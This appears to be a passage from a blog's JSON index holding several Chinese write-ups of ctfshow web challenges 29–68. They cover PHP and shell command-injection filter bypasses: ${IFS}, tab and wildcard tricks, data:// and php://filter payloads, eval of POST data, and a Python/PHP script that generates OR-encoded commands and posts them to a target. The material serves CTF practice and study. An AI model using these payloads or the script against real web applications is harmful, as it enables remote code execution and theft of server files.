web57\n![](/pic/57.png)\n题目显示flag在36.php中，而且给出cat和php了，只要想办法构造出36就可以了。\n`$(())`是做运算，`$((${_}))=0`,所以只要拼接除-36之后取反就行\npayload:\n~~~\n?c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\n~~~\n<!--more-->\n# web58\n![](/pic/web58.png)\n题很短，但是我不会。。。\n参考文章[](https://blog.csdn.net/miuzzx/article/details/108619930)\npayload太多了\n~~~\nc=show_source(\"flag.php\");\n~~~\n# web59\n和web58差不多。\npayload：\n~~~\nc=show_source(\"flag.php\");\n~~~\n# web60\n和前两道题一样。\npayload:\n~~~\nc=show_source(\"flag.php\");\n~~~\n# web 61~65\n这些题都一样。\npayload：\n~~~\nc=show_source(\"flag.php\");\n~~~\n# web66\n![](/pic/66.png)\n这一道题`show_source`不能用了。\n![](/pic/66.1.png)\n而且flag还不在flag.php中。\n![](/pic/66.2.png)\n先用\n~~~\nvar_dump(scandir('/'));\n~~~\n查看目录结构，发现是flag.txt\npayload:\n~~~\nc=highlight_flie(\"/flag.txt\");\n~~~\n# web67\n这一题和上一题一样。\n~~~\nc=highlight_file(\"/flag.txt\");\n~~~\n# web68\n![](/pic/68.png)\n这一道题我都懵了，怎么不给源码啊。\n看别人的wp说的换成文件包含就可以。。。。\npayload:\n~~~\nc=include(\"/flag.txt\");\n~~~","tags":["ctfshow","刷题","web"],"categories":["web","ctfshow","刷题"]},{"title":"ctfshow web入门53~56","url":"/2023/01/20/ctfshow-web入门52~56/","content":"# web53\n![](/pic/53.png)\n多过滤了一个wget，多添加了一个回显。\npayload:\n~~~\n?c=ca''t${IFS}fla''g.php\n~~~\n<!--more-->\n# web54\n![](/pic/54.png)\n这道将使用`''`的方式给剔除了。去网上找其他人的wp发现好几种方法。\n第一种：\n可以用mv。\npayload:\n~~~\n/?c=mv${IFS}fla?.php${IFS}abc.txt\n/abc.txt\n~~~\n第二种：\n~~~\ngrep test *file   #在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行\n~~~\npayload：\n~~~\n?c=grep${IFS}ctf${IFS}fl???php\n~~~\n第三种：\n可以用`rev`逆序输出\npayload:\n~~~\n?c=rev${IFS}fl??????\n~~~\n第四种：\n用`paste`直接查看\npayload:\n~~~\n?c=paste${IFS}fl??????\n~~~\n第五种：\n可以理解为当前目录运行cat命令实际上运行的也是bin/cat。\npayload：\n~~~\n/bin/?at${IFS}fl??????\n~~~\n# web55\n![img](/pic/55.png)\n题是真的恶心，脑子有点痒，感觉要长脑子了。。。。\n[继无字母数字的命令执行(ctfshow web入门 55)新姿势](https://blog.csdn.net/qq_46091464/article/details/108555433)\npayload:\n~~~\n?c=/???/????64 ????.???\n~~~\n# web56\n![img](/pic/56.png)\n题是越来越难了。\n参考P神的文章[上无字母数字webshell之提高篇](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)\n首先构造一个POST上传文件的数据包\n~~~\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>POST文件上传</title>\n</head>\n<body>\n<form action=\"http://17d01aae-51d9-48fe-abfb-d9ba10037d72.chall.ctf.show/\" method=\"post\" enctype=\"multipart/form-data\">\n    <!--链接是当前打开的题目链接-->\n    <label for=\"file\">文件名：</label>\n    <input type=\"file\" name=\"file\" id=\"file\"><br>\n    <input type=\"submit\" name=\"submit\" value=\"提交\">\n</form>\n</body>\n</html>\n~~~\n上传一个php文件\n~~~\n#!/bin/sh\nls\n~~~\n注：shell程序必须以\"#!/bin/sh\"开始，#! /bin/sh 是指此脚本使用/bin/sh来解释执行，#!是特殊的表示符，其后面跟的是解释此脚本的shell的路径\n用bp抓包\n抓包之后添加参数c如下，多发包几次（因为并不一定生成的临时文件的最后一个字母就是大写字母），可以看到执行了ls命令\n![img](/pic/56.1)\n参数内容为什么是 .%20/???/????????[@-[] ,P神的文章已经写的很详细了。\n最后用cat看一下就可以了\n![](/pic/56.2)","tags":["ctfshow","刷题","web"],"categories":["web","ctfshow","刷题"]},{"title":"ctfshow 刷题web45~52","url":"/2023/01/17/ctfshow-刷题web45~52/","content":"# web45\n![img](/pic/45.png)\n过滤了空格，用`%09`绕过，&&等于;，也可以用`||`和`%0a`。\npayload:\n~~~\n/?c=tac%09fl*||\n/?c=sort%09fl*||\n/?c=echo%09`tac%09fla*`||\n~~~\n<!--more-->\n# web46\n![img](/pic/46.png)\n多过滤了一些字符，但还是可以%`09`过滤空格，因为`%09`解码后就不是数字了，是一个水平制表符。\n`*`被过滤了，可以用`?`\npayload:\n~~~\n/?c=tac%09fla?.php||\n/?c=nl<fla''g.php|| nl查看源代码，<代替空格，''分割flag过滤，||解决命令黑洞\n~~~\n# web47\n![](/pic/47.png)\n无非就是sort无法用了，上一题的payload还可以用。\n# web48\n![](/pic/48.png)\n上一题的payload依然可以用。\n# web49\n![](/pic/49.png)\n依然可以用。\n# web50\n![](/pic/50.png)\n`%09`过滤了，`<>`和`?`一起使用时没有回显,所以这里的`?`可以用`\\`和`''`进行代替,。\npaylaod:\n~~~\n/?c=tac<fla\\g.php||\n/?c=nl<fla''g.php||\n~~~\n# web51\n![](/pic/51.png)\ntac被过滤了，只能用nl。\npayload:\n~~~\n?c=nl<fla\\g.php||\n~~~\n# web52\n![](/pic/52.png)\n<>也被过滤了，还可以用`$IFS`\npayload:\n~~~\n/?c=nl${IFS}fla\\g.php||\n~~~","tags":["ctfshow","刷题","web"],"categories":["web","ctfshow","刷题"]},{"title":"ctfshow web入门41~44","url":"/2023/01/14/ctfshow41-44/","content":"# web41\n![img](/pic/web41.png)\n这个题过滤了$、+、-、^、~使得异或自增和取反构造字符都无法使用，同时过滤了字母和数字。但是特意留了个或运算符|。\n我们可以尝试从ascii为0-255的字符中，找到或运算能得到我们可用的字符的字符。\n<!--more-->\n借用师傅们的脚本：https://blog.csdn.net/miuzzx/article/details/108569080\n~~~\n<?php\n$myfile = fopen(\"rce_or.txt\", \"w\");\n$contents=\"\";\nfor ($i=0; $i < 256; $i++) { \n\tfor ($j=0; $j <256 ; $j++) { \n\n\t\tif($i<16){\n\t\t\t$hex_i='0'.dechex($i);\n\t\t}\n\t\telse{\n\t\t\t$hex_i=dechex($i);\n\t\t}\n\t\tif($j<16){\n\t\t\t$hex_j='0'.dechex($j);\n\t\t}\n\t\telse{\n\t\t\t$hex_j=dechex($j);\n\t\t}\n\t\t$preg = '/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\&|\\-/i';\n\t\tif(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){\n\t\t\t\t\techo \"\";\n    }\n  \n\t\telse{\n\t\t$a='%'.$hex_i;\n\t\t$b='%'.$hex_j;\n\t\t$c=(urldecode($a)|urldecode($b));\n\t\tif (ord($c)>=32&ord($c)<=126) {\n\t\t\t$contents=$contents.$c.\" \".$a.\" \".$b.\"\\n\";\n\t\t}\n\t}\n\n}\n}\nfwrite($myfile,$contents);\nfclose($myfile);\n~~~\n~~~\n# -*- coding: utf-8 -*-\nimport requests\nimport urllib\nfrom sys import *\nimport os\nos.system(\"php rce_or.php\")  #没有将php写入环境变量需手动运行\nif(len(argv)!=2):\n   print(\"=\"*50)\n   print('USER：python exp.py <url>')\n   print(\"eg：  python exp.py http://ctf.show/\")\n   print(\"=\"*50)\n   exit(0)\nurl=argv[1]\ndef action(arg):\n   s1=\"\"\n   s2=\"\"\n   for i in arg:\n       f=open(\"rce_or.txt\",\"r\")\n       while True:\n           t=f.readline()\n           if t==\"\":\n               break\n           if t[0]==i:\n               #print(i)\n               s1+=t[2:5]\n               s2+=t[6:9]\n               break\n       f.close()\n   output=\"(\\\"\"+s1+\"\\\"|\\\"\"+s2+\"\\\")\"\n   return(output)\n   \nwhile True:\n   param=action(input(\"\\n[+] your function：\") )+action(input(\"[+] your command：\"))\n   data={\n       'c':urllib.parse.unquote(param)\n       }\n   r=requests.post(url,data=data)\n   print(\"\\n[*] result:\\n\"+r.text)\n~~~\n![img](/pic/web41.1.png)\n得到flag\n# web42\n![img](/pic/web42.png)\n~~~\n1：> 代表重定向到哪里，例如：echo “123” > /home/123.txt\n2：/dev/null 代表空设备文件\n3：2> 表示stderr标准错误\n4：& 表示等同于的意思，2>&1，表示2的输出重定向等同于1\n5：1 表示stdout标准输出，系统默认值是1，所以\">/dev/null\"等同于 “1>/dev/null”\n~~~\n参考：https://www.cnblogs.com/kexianting/p/11630085.html\n用双写绕过\npayload:\n~~~\n?c=cat flag.php;ls\n~~~\n# web43\n![img](/pic/web43.png)\n将;过滤掉了，可以使用其他的命令分隔符；\n常见的命令分隔符：\n~~~\n1、“;”分隔符\n用分号分隔的命令会按顺序执行，即使中间命令使用方式不对，会有相关错误输出，后面的命令照样会执行。如：\n输入：命令A；命令B；命令C\n按顺序执行A、B、C命令，若B命令调用方式不对，终端会有相关错误提示，提示后会继续执行C命令。\n2、“&&”分隔符\n同C、C++语言逻辑运算符\"&&\"类似，遇到首个命令执行失败后，后面的命令不会执行。如：\n输入：命令A && 命令B && 命令C\n先执行命令A，若A命令执行正确则再执行命令B。假如命令B执行失败，则停止，C命令不会被执行到。\n3、“||”分隔符\n同C、C++语言逻辑运算符\"||\"类似，遇到首个命令执行成功后，后面的命令不会执行。如：\n输入：命令A || 命令B || 命令C\n先执行命令A，若A命令执行失败则再执行命令B。假如命令B执行成功，则停止，C命令不会被执行到。\n~~~\npayload：\n~~~\n?c=tac flag.php||ls\n~~~\n# web44\n![img](/pic/web44.png)\nflag也过滤了，就用通配符呗。\npayload:\n~~~\n/?c=tac fl*||ls\n~~~\n常见的通配符有`*`、`?`。","tags":["ctfshow","刷题","web"],"categories":["web","ctfshow","刷题"]},{"title":"chtshow web入门37~40","url":"/2023/01/11/chtshow37-40/","content":"# web 37\n![img](/pic/web37.png)\n考察data伪协议，data伪协议需满足allow_url_fopen，allow_url_include同时开启才能使用。\npayload：\n~~~\n/?c=data://text/plain,<?php system(\"cat fl*\");?>\n~~~\n# web38\n![img](/pic/web38.png)\nphp被过滤了，可以用短标签绕过php。\n短标签：比<?php ?>更灵活调用的方法  <? /*程序操作*/ ?>  <?=/*函数*/?>\npaylaod：\n~~~\n?c=data://text/plain,<?=`cat fla*`;?>\n/?c=data://text/plain,<?=system(\"cat fl*\");?>\n~~~\n<!--more-->\n# web39\ninclude中多了个.php，但是上一题的payload也管用，看别人的wp说是有?>结尾进行闭合，所以没有影响。\npayload:\n~~~\n/?c=data://text/plain,<?php system(\"cat fla*\")?>\n~~~\n# web40\n![img](/pic/web40.png)\n这个过滤了不少东西，但是没有过滤英文字母、下划线和英文的括号。\n可以用提示的方法\n~~~\nshow_source(next(array_reverse(scandir(pos(localeconv())))));\nshow_source()函数对文件进行语法高亮显示\nnext() 函数将内部指针指向数组中的下一个元素，并输出\narray_reverse() 函数以相反的元素顺序返回数组\nscandir() 函数返回指定目录中的文件和目录的数组\npos() 函数返回数组中的当前元素的值\nlocaleconv() 函数返回一包含本地数字及货币格式信息的数组\n~~~\n也可以换其他方法\n首先\n~~~\n/?c=print_r(get_defined_vars());\n~~~\n获得一下信息\n![img](/pic/web40.1.png)\n使用next获取这个数组的下一个位置的元素，也就是POST的元素.\n~~~\n/?c=print_r(next(get_defined_vars()));\n~~~\n![img](/pic/web40.2.png)\n然后把这个元素弹出，用array_pop\n~~~\n/?c=print_r(array_pop(next(get_defined_vars())));\n~~~\n![img](/pic/web40.3.png)\n最后再用eval执行一下就可以了\n~~~\n/?c=eval(array_pop(next(get_defined_vars())));\n~~~\nPOST数据\n~~~\n1=system(\"cat flag.php\");或1=echo`cat flag.php`;\n~~~\n关于echo、print、print_r的区别可以参考：https://blog.51cto.com/zlong37/1556855\n# 常用的注释符\n```\n#、--、-- -、//、/**/、/*letmetest*/、;%00\n```\n# MySQL中可以代替空格的字符\n```\n/**/、()、=、%20、%09、%0a、0x0a、0x0b、0x0c、0x0d、+、-、~、.等等\n```","tags":["ctfshow","刷题","web"],"categories":["web","ctfshow","刷题"]},{"title":"ctfshow web入门29~36","url":"/2023/01/09/ctfshow29-36/","content":"# web29\n![img](/pic/web29.png)\n过滤了flag，可以用system,echo等。\n~~~\n/?c=system(\"cat fla*\");\n/?c=echo`cat fl*`;\n~~~\n# web30\n![img](/pic/web30.png)\n多过滤了一个system，还可以用echo。\n~~~\n/?echo`cat fl*`;\n~~~\n<!--more-->\n# web31\n![img](/pic/web31.png)\ncat和空格过滤了，可以用tac.\n空格可以用%09绕过。\n~~~\n/?c=echo%09`tac%09fl*`;\n~~~\n# web32\n![img](/pic/web32.png)\n过滤的东西太多了左括号都给过滤了，使用命令逃逸+文件包含\n空格可以用%09绕过， ；可以用?>绕过,因为使用?>，所以后面没办法直接拼接php语句，需要使用文件包含。\n~~~\n/?c=include%09$_GET[1]?>&&1=php://filter/convert.base64-encode/resource=flag.php\n~~~\n再将得到的进行base64解码得到flag\n# web33\n![img](/pic/web33.png)\n和web32差不多，用同样的payload就行\n~~~\n/?c=include%09$_GET[1]?>&&1=php://filter/convert.base64-encode/resource=flag.php\n~~~\n# web34\n依旧可以用同样的payload\n~~~\n/?c=include%09$_GET[1]?>&&1=php://filter/convert.base64-encode/resource=flag.php\n~~~\n# web35\n依旧可以用同样的payload\n~~~\n/?c=include%09$_GET[1]?>&&1=php://filter/convert.base64-encode/resource=flag.php\n~~~\n连续几道题都一样，写的真恶心。\n# web36\n这道题把1换成其他的字符就行，其他步骤一样。\n~~~\n/?c=include%09$_GET[a]?>&&a=php://filter/convert.base64-encode/resource=flag.php\n~~~\n\nrequire可以代替include，PHP常用的可以不加括号的函数echo、print、isset、unset、include、require。","tags":["ctfshow","刷题","web"],"categories":["web","ctfshow","刷题"]}]